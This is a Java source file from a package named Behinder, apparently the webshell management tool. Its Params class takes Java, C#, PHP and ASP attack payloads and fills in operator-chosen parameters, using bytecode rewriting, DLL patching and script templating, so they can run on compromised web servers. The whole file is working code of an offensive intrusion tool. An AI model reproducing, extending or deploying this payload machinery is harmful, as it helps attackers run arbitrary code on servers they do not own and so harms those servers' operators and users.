package net.rebeyond.behinder.core;

import java.util.Base64;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.Map;
public class Params {

    public static class t extends ClassLoader {
        public Class get(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public static byte[] getParamedClass(String clsName, final Map<String, String> params) throws Exception {
        ClassReader classReader = new ClassReader(clsName);
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new ClassAdapter(cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (!params.containsKey(filedName)) {
                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                }
                return super.visitField(arg0, filedName, arg2, arg3, params.get(filedName));
            }
        }, 0);
        return cw.toByteArray();
    }

    public static byte[] getParamedAssembly(String clsName, Map<String, String> params) throws Exception {
        byte[] result = Utils.getResourceData("net/rebeyond/behinder/payload/csharp/" + clsName + ".dll");
        if (params.keySet().size() == 0) {
            return result;
        }
        String paramsStr = "";
        for (String paramName : params.keySet()) {
            paramsStr = paramsStr + paramName + ":" + Base64.getEncoder().encodeToString(params.get(paramName).getBytes()) + ",";
        }
        return Utils.mergeBytes(result, ("~~~~~~" + paramsStr.substring(0, paramsStr.length() - 1)).getBytes());
    }

    public static byte[] getParamedAssemblyClassic(String clsName, Map<String, String> params) throws Exception {
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/payload/csharp/" + clsName + ".dll"));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (String paraName : params.keySet()) {
            String paraValue = params.get(paraName);
            StringBuilder searchStr = new StringBuilder();
            while (searchStr.length() < paraValue.length()) {
                searchStr.append(paraName);
            }
            InputStream ris = new ReplacingInputStream(bis, Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0), Utils.ascii2unicode(paraValue, 1));
            while (true) {
                int b = ris.read();
                if (-1 == b) {
                    break;
                }
                bos.write(b);
            }
            ris.close();
        }
        return bos.toByteArray();
    }

    public static byte[] getParamedPhp(String clsName, Map<String, String> params) throws Exception {
        String payloadPath = "net/rebeyond/behinder/payload/php/" + clsName + ".php";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (true) {
            int b = bis.read();
            if (-1 == b) {
                break;
            }
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        for (String paraName : params.keySet()) {
            code.append(String.format("$%s=\"%s\";", paraName, params.get(paraName)));
            paraList = paraList + ",$" + paraName;
        }
        code.append("\r\nmain(" + paraList.replaceFirst(",", "") + ");");
        return code.toString().getBytes();
    }

    public static byte[] getParamedAsp(String clsName, Map<String, String> params) throws Exception {
        String payloadPath = "net/rebeyond/behinder/payload/asp/" + clsName + ".asp";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        while (true) {
            int b = bis.read();
            if (-1 == b) {
                break;
            }
            bos.write(b);
        }
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        if (params.size() > 0) {
            String paraList2 = paraList + "Array(";
            for (String paraName : params.keySet()) {
                String paraValue = params.get(paraName);
                String paraValueEncoded = "";
                for (int i = 0; i < paraValue.length(); i++) {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                }
                paraList2 = paraList2 + "," + paraValueEncoded.replaceFirst("&", "");
            }
            paraList = paraList2 + ")";
        }
        code.append("\r\nmain " + paraList.replaceFirst(",", ""));
        return code.toString().getBytes();
    }
}
